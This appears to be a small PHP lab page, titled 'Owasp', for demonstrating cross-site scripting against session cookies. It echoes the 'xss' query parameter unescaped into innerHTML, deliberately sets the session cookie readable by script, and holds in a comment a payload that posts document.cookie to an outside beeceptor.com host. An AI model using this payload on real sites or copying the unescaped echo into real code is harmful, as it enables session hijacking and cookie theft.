<?php 
    $sess_name = session_name();
    if (session_start()) {
        setcookie($sess_name, session_id(), true, '/', null, null, false);
    }
?>
<!-- http://localhost:8080/session/session_secure.php?xss=`%3Cimg%20src=vo%20onerror=%22fetch(%27https://security.free.beeceptor.com/%27,%20{%20method:%20%27POST%27,%20body:%20document.cookie})%22%20%3E` -->
<!DOCTYPE html>
<html>
<head>
  <title>Owasp</title>
</head>
<body>
<div id="test">
</div>

</body>
</html>
</style>

<script>
    window.document.getElementById('test').innerHTML = <?php echo $_GET['xss'] ?>
</script>
